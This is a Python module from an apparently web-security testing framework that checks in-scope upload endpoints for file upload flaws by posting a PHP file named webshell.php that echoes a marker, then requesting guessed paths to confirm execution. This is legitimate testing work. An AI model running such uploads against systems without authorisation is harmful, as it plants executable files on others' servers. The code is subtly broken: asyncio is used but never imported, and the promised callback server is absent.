# workers/business_logic/tools/malicious_upload_tester.py
"""Malicious file upload testing tool — WSTG 4.10.9."""

import aiohttp
from workers.business_logic.base_tool import BusinessLogicTool


class MaliciousUploadTester(BusinessLogicTool):
    """Test for malicious file upload vulnerabilities using callback server."""

    async def execute(self, target_id: int, **kwargs):
        """Execute malicious upload tests using callback server."""
        scope_manager = kwargs.get("scope_manager")
        if not scope_manager:
            return

        upload_endpoints = await self._get_upload_endpoints(target_id, scope_manager)

        async with aiohttp.ClientSession() as session:
            for asset_id, url in upload_endpoints:
                await self._test_malicious_upload(session, target_id, asset_id, url)

    async def _get_upload_endpoints(self, target_id: int, scope_manager):
        """Get file upload endpoints."""
        from lib_webbh import get_session, Asset
        from sqlalchemy import select

        endpoints = []
        async with get_session() as session:
            result = await session.execute(
                select(Asset.id, Asset.asset_value)
                .where(Asset.target_id == target_id)
                .where(Asset.asset_type == "url")
            )

            for row in result:
                asset_id, url = row
                if scope_manager.is_in_scope(url) and any(keyword in url.lower() for keyword in ['upload', 'file']):
                    endpoints.append((asset_id, url))

        return endpoints

    async def _test_malicious_upload(self, session, target_id, asset_id, url):
        """Test malicious file upload with callback monitoring."""
        # Create a malicious PHP webshell
        webshell_content = b'<?php echo "webshell executed"; ?>'

        try:
            # Create multipart form data with webshell
            data = aiohttp.FormData()
            data.add_field('file', webshell_content, filename='webshell.php')

            async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status == 200:
                    response_text = await resp.text()
                    if "uploaded" in response_text.lower() or "success" in response_text.lower():
                        # Try to access the uploaded webshell
                        await self._test_webshell_execution(session, target_id, asset_id, url)
        except (aiohttp.ClientError, asyncio.TimeoutError):
            pass

    async def _test_webshell_execution(self, session, target_id, asset_id, upload_url):
        """Test if uploaded webshell can be executed."""
        # Common webshell access patterns
        webshell_urls = [
            f"{upload_url}/webshell.php",
            f"{upload_url}/uploads/webshell.php",
        ]

        for webshell_url in webshell_urls:
            try:
                async with session.get(webshell_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        response_text = await resp.text()
                        if "webshell executed" in response_text:
                            await self.save_vulnerability(
                                target_id=target_id,
                                asset_id=asset_id,
                                severity="critical",
                                title="Malicious File Upload Vulnerability",
                                description=f"Web shell successfully uploaded and executed at {webshell_url}",
                                poc=webshell_url,
                                vuln_type="malicious_file_upload",
                            )
                            break
            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue
